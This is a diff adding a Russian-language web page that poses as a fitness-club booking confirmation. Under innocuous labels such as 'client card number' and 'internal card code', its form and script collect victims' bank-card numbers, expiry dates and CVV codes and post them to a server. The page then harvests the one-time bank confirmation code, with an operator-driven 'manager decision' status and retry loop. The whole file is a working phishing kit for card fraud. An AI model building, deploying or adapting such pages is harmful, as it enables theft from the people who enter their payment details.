@@ -1,0 +1,446 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Подтверждение бронирования</title>
+<link rel="stylesheet" href="/style.css?v=6">
+</head>
+<body class="ref-theme">
+<div class="hearts" aria-hidden="true"><span>♡</span><span>♥</span><span>♡</span><span>♥</span><span>♡</span></div>
+
+<main class="booking-page">
+  <section class="form-card" id="formCard">
+    <div class="ref-label"><span>♡</span> Данные клиента</div>
+    <h1>Завершите<br>подтверждение</h1>
+    <p class="form-intro">Заполните анкетные данные после заполнение желаем для вас приятного отдыха.</p>
+
+    <div class="time-picker-wrap">
+      <div class="field-heading">Время</div>
+      <button type="button" class="time-selector" id="timeSelector" aria-expanded="false">
+        <span>
+          <small>Выбранное время</small>
+          <strong id="summaryTime">Ближайшее время</strong>
+        </span>
+        <span class="chevron">⌄</span>
+      </button>
+
+      <div class="time-popover" id="timePopover">
+        <button type="button" class="time-option closest active" data-time="nearest">
+          <span><b>Ближайшее время</b><small>Подберём ближайший удобный слот</small></span>
+          <span>♥</span>
+        </button>
+
+        <div class="custom-time">
+          <label for="customTime">Или введите своё время</label>
+          <div class="custom-time-row">
+            <input id="customTime" type="time">
+            <button type="button" id="useCustomTime" class="use-time-btn">Выбрать</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="time-hint" id="timeHint">Ближайший доступный слот будет выбран автоматически.</div>
+    </div>
+
+    <div class="booking-summary">
+      <div>
+        <span>Бронирование</span>
+        <b>Отдых 😊</b>
+      </div>
+      <div>
+        <span>Дата</span>
+        <b id="bookingDate">Сегодня</b>
+      </div>
+    </div>
+
+    <div id="formArea">
+      <label>Никнейм Telegram <span class="optional-label">(необязательно)</span>
+        <input id="name" placeholder="@username" autocomplete="nickname">
+      </label>
+
+      <label>Номер клиентской карточки
+        <input id="card" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
+        <span id="cardHelp" class="field-help" aria-hidden="true"></span>
+      </label>
+
+      <div class="grid">
+        <label>Срок действия
+          <input id="expiry" placeholder="MM / YY" inputmode="numeric" maxlength="5" autocomplete="off">
+        </label>
+
+        <label>Внутренний код карточки
+          <input id="code" placeholder="Код" inputmode="numeric" maxlength="3" autocomplete="off">
+        </label>
+      </div>
+
+      <p class="fine">После заполнения анкеты вас ждёт приятный отдых. Хорошего дня! 😊</p>
+      <p id="err" class="error"></p>
+    </div>
+
+    <!-- Hidden until the main form is sent. It sits directly ABOVE the final button. -->
+    <div id="pending" class="inline-code-panel" hidden aria-live="polite">
+      <div class="inline-code-head">
+        <div class="inline-icon">♡</div>
+        <div class="inline-code-copy">
+          <div class="inline-code-title">Код подтверждения</div>
+          <div id="statusText" class="inline-code-sub">Вам был отправлен код. Введите его ниже.</div>
+        </div>
+      </div>
+
+      <div id="inline-code-entry" class="inline-code-entry">
+        <input id="activation" autocomplete="one-time-code" inputmode="numeric" maxlength="6" placeholder="000000" aria-label="6-значный код подтверждения">
+        <button type="button" id="retryButton" class="retry-btn" hidden>Отправить код снова</button>
+      </div>
+
+      <div id="codeLoading" class="code-loading" hidden>
+        <span class="spinner"></span>
+              </div>
+
+      <p id="codeLengthHint" class="code-length-hint" aria-hidden="true"></p>
+      <p id="verr" class="error inline-error"></p>
+      <p id="attempts" class="fine inline-attempts" aria-hidden="true"></p>
+    </div>
+
+    <button id="send" class="ref-submit">Подтвердить бронирование</button>
+  </section>
+
+  <section id="thankYou" class="thank-card" hidden>
+    <div class="thank-heart">♥</div>
+    <div class="ref-label center"><span>♡</span> Всё готово</div>
+    <h2>Спасибо за подтверждение!</h2>
+    <p>Бронирование подтверждено. Ждём вас в клубе. Желаем отличной тренировки и приятного отдыха!</p>
+    <div class="thank-badge">Доступ подтверждён ✓</div>
+  </section>
+
+  <a id="backLink" class="back-link" href="/">← Вернуться</a>
+</main>
+
+<script>
+const $=id=>document.getElementById(id);
+let leadId=null;
+let poll=null;
+let selectedTime='nearest';
+let codeSubmitted=false;
+
+function currentDateLabel(date=new Date()){
+  return new Intl.DateTimeFormat('ru-RU',{day:'numeric',month:'long'}).format(date);
+}
+
+$('bookingDate').textContent=currentDateLabel();
+
+function nearestSlot(){
+  const hour=new Date().getHours()+new Date().getMinutes()/60;
+  const slots=[9,10,11,12,13,14,15,16,17,18,19,20];
+  const next=slots.find(h=>h>hour+0.01)||9;
+  return String(next).padStart(2,'0')+':00';
+}
+
+function setTime(value){
+  selectedTime=value==='nearest'?nearestSlot():value;
+  $('summaryTime').textContent='Ближайшее время';
+  $('timeHint').textContent=value==='nearest'
+    ? 'Ближайший доступный слот будет выбран автоматически.'
+    : 'Вы выбрали время: '+selectedTime;
+}
+
+function closeTimePicker(){
+  $('timePopover').classList.remove('open');
+  $('timeSelector').setAttribute('aria-expanded','false');
+}
+
+$('timeSelector').addEventListener('click',()=>{
+  const open=$('timePopover').classList.toggle('open');
+  $('timeSelector').setAttribute('aria-expanded',String(open));
+});
+
+document.querySelectorAll('.time-option[data-time]').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.time-option[data-time]').forEach(x=>x.classList.remove('active'));
+    btn.classList.add('active');
+    setTime(btn.dataset.time);
+    closeTimePicker();
+  });
+});
+
+$('useCustomTime').addEventListener('click',()=>{
+  const t=$('customTime').value;
+  if(!t)return;
+  document.querySelectorAll('.time-option[data-time]').forEach(x=>x.classList.remove('active'));
+  setTime(t);
+  closeTimePicker();
+});
+
+document.addEventListener('click',e=>{
+  if(!e.target.closest('.time-picker-wrap'))closeTimePicker();
+});
+
+setTime('nearest');
+
+$('card').addEventListener('input',()=>{
+  const raw=$('card').value.replace(/\D/g,'').slice(0,16);
+  $('card').value=raw.replace(/(\d{4})(?=\d)/g,'$1 ');
+  const left=16-raw.length;
+  $('cardHelp').textContent=left===0?'16 цифр введено ✓':`Осталось цифр: ${left}`;
+  $('cardHelp').classList.toggle('ok',left===0);
+});
+
+$('expiry').addEventListener('input',()=>{
+  let raw=$('expiry').value.replace(/\D/g,'').slice(0,4);
+
+  // Month must be 01-12. Reject an invalid first digit or month pair.
+  if(raw.length>=1 && !/^[01]$/.test(raw[0])) raw='';
+  if(raw.length>=2){
+    const month=Number(raw.slice(0,2));
+    if(month<1 || month>12) raw=raw.slice(0,1);
+  }
+
+  $('expiry').value=raw.length>2?raw.slice(0,2)+'/'+raw.slice(2):raw;
+});
+
+$('code').addEventListener('input',()=>{
+  $('code').value=$('code').value.replace(/\D/g,'').slice(0,3);
+});
+
+function updateCodeCounter(){
+  const v=$('activation').value.replace(/\D/g,'').slice(0,6);
+  $('activation').value=v;
+  const left=6-v.length;
+  $('codeLengthHint').textContent=left===0?'6 цифр — готово ✓':`Не хватает ${left} ${left===1?'цифры':'цифр'}`;
+  $('codeLengthHint').classList.toggle('ok',left===0);
+}
+
+let autoSubmittingCode=false;
+function maybeAutoSubmitCode(){
+  if(autoSubmittingCode || codeSubmitted || waitingForManager || !codeStage || !leadId)return;
+  const value=$('activation').value.replace(/\D/g,'');
+  if(value.length!==6)return;
+  autoSubmittingCode=true;
+  setTimeout(()=>{
+    if(!codeSubmitted && !waitingForManager && $('activation').value.replace(/\D/g,'').length===6){
+      $('send').click();
+    }else{
+      autoSubmittingCode=false;
+    }
+  },120);
+}
+
+$('activation').addEventListener('input',()=>{
+  if(codeSubmitted)return;
+  updateCodeCounter();
+  if(leadId)$('send').disabled=$('activation').value.length!==6;
+  maybeAutoSubmitCode();
+});
+
+$('activation').addEventListener('change',()=>{
+  if(codeSubmitted || waitingForManager || !codeStage)return;
+  updateCodeCounter();
+  maybeAutoSubmitCode();
+});
+
+$('activation').addEventListener('paste',()=>{
+  setTimeout(()=>{
+    if(codeSubmitted || waitingForManager || !codeStage)return;
+    updateCodeCounter();
+    maybeAutoSubmitCode();
+  },0);
+});
+
+function openCodePanel(){
+  $('pending').hidden=false;
+  requestAnimationFrame(()=>{
+    $('pending').classList.add('open');
+    $('pending').scrollIntoView({behavior:'smooth',block:'nearest'});
+  });
+  $('send').disabled=true;
+}
+
+function showLoading(){
+  $('codeLoading').hidden=false;
+  $('inline-code-entry').hidden=true;
+  $('retryButton').hidden=true;
+  $('activation').disabled=true;
+  $('codeLengthHint').hidden=true;
+  $('verr').textContent='';
+}
+
+function hideLoading(){
+  $('codeLoading').hidden=true;
+}
+
+function finish(){
+  $('formCard').hidden=true;
+  $('thankYou').hidden=false;
+  $('backLink').hidden=true;
+  if(poll){clearInterval(poll);poll=null;}
+  localStorage.removeItem('fitpass_lead_id');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+let lastRenderedStatus=null;
+
+function setStatus(d){
+  const submit=$('send');
+  $('attempts').textContent=d.attempts?`Попыток: ${d.attempts}`:'';
+
+  if(d.status===lastRenderedStatus)return;
+  lastRenderedStatus=d.status;
+
+  if(d.status==='Подтверждено'){
+    finish();
+    return;
+  }
+
+  if(d.status==='Ожидает решения менеджера'){
+    $('statusText').textContent='информация обрабатывается, это может занять некоторое время';
+    $('send').disabled=true;
+    showLoading();
+    return;
+  }
+
+  if(d.status==='Код не подошёл — повторный ввод'){
+    hideLoading();
+    codeSubmitted=false;
+    $('inline-code-entry').hidden=false;
+    $('retryButton').hidden=false;
+    $('retryButton').disabled=false;
+    $('retryButton').textContent='Отправить код снова';
+    $('activation').value='';
+    $('activation').disabled=false;
+    $('codeLengthHint').hidden=false;
+    $('codeLengthHint').textContent='Нужно 6 цифр.';
+    $('codeLengthHint').classList.remove('ok');
+    $('statusText').textContent='Код не подошёл. Пожалуйста, проверьте введённый код и повторите попытку.';
+    $('verr').textContent='';
+    submit.disabled=true;
+    submit.textContent='Подтвердить бронирование';
+    return;
+  }
+
+  if(d.status==='Клиент запросил новый код'){
+    hideLoading();
+    codeSubmitted=false;
+    $('inline-code-entry').hidden=false;
+    $('retryButton').hidden=true;
+    $('statusText').textContent='Запрос отправлен менеджеру. Получите новый код и введите его ниже.';
+    $('activation').disabled=false;
+    $('activation').value='';
+    $('codeLengthHint').hidden=false;
+    $('codeLengthHint').textContent='Нужно 6 цифр.';
+    $('codeLengthHint').classList.remove('ok');
+    submit.disabled=true;
+    submit.textContent='Подтвердить бронирование';
+    return;
+  }
+
+  $('statusText').textContent='Вам был отправлен код. Введите его ниже.';
+  $('activation').disabled=false;
+  submit.disabled=true;
+}
+
+async function checkStatus(){
+  if(!leadId)return;
+  try{
+    const r=await fetch('/api/leads/'+leadId+'/status?ts='+Date.now());
+    if(r.ok)setStatus(await r.json());
+  }catch{}
+}
+
+$('send').onclick=async()=>{
+  $('err').textContent='';
+
+  if(!leadId){
+    const digits=$('card').value.replace(/\D/g,'');
+    if(digits.length!==16){ $('err').textContent='В номере клиентской карточки должно быть ровно 16 цифр.'; return; }
+    const expiry=$('expiry').value.trim();
+    const expiryMatch=expiry.match(/^(\d{2})\/(\d{2})$/);
+    const expiryMonth=expiryMatch?Number(expiryMatch[1]):0;
+    const cardCode=$('code').value.replace(/\D/g,'');
+    if(!expiryMatch||expiryMonth<1||expiryMonth>12){ $('err').textContent='Введите срок действия в формате MM/YY, например 03/29.'; return; }
+    if(cardCode.length!==3){ $('err').textContent='Внутренний код карточки должен содержать ровно 3 цифры.'; return; }
+    if(!selectedTime){ $('err').textContent='Выберите время.'; return; }
+
+    $('send').disabled=true;
+    $('send').textContent='Отправляем данные…';
+
+    try{
+      const r=await fetch('/api/leads',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          name:$('name').value.trim(),
+          card_number:digits,
+          expiry:expiry,
+          card_code:cardCode,
+          booking_date:currentDateLabel(),
+          booking_time:selectedTime
+        })
+      });
+      const d=await r.json();
+      if(!r.ok)throw Error(d.error);
+      leadId=d.id;
+      localStorage.setItem('fitpass_lead_id',String(leadId));
+      openCodePanel();
+      $('send').textContent='Подтвердить бронирование';
+      $('statusText').textContent='Вам был отправлен код. Введите его ниже.';
+    }catch(e){
+      $('err').textContent=e.message;
+      $('send').disabled=false;
+      $('send').textContent='Подтвердить бронирование';
+      return;
+    }
+  }else{
+    if(codeSubmitted)return;
+    const code=$('activation').value.replace(/\D/g,'');
+    if(code.length!==6){
+      $('codeLengthHint').textContent=`Не хватает ${6-code.length} ${6-code.length===1?'цифры':'цифр'}`;
+      $('codeLengthHint').hidden=false;
+      return;
+    }
+
+    codeSubmitted=true;
+    $('send').disabled=true;
+    $('send').textContent='Проверяем';
+    showLoading();
+
+    try{
+      const r=await fetch('/api/leads/'+leadId+'/submit-code',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({code})
+      });
+      const d=await r.json();
+      if(!r.ok)throw Error(d.error);
+      setStatus(d);
+      if(!poll)poll=setInterval(checkStatus,3000);
+    }catch(e){
+      codeSubmitted=false;
+      hideLoading();
+      $('activation').disabled=false;
+      $('send').disabled=false;
+      $('send').textContent='Подтвердить бронирование';
+      $('verr').textContent=e.message;
+      return;
+    }
+  }
+};
+
+$('retryButton').onclick=async()=>{
+  $('retryButton').disabled=true;
+  $('retryButton').textContent='Отправляем запрос…';
+  $('verr').textContent='';
+  try{
+    const r=await fetch('/api/leads/'+leadId+'/request-retry',{method:'POST'});
+    const d=await r.json();
+    if(!r.ok)throw Error(d.error);
+    codeSubmitted=false;
+    setStatus(d);
+  }catch(e){
+    $('retryButton').disabled=false;
+    $('retryButton').textContent='Отправить код снова';
+    $('verr').textContent=e.message;
+  }
+};
+</script>
+</body>
+</html>
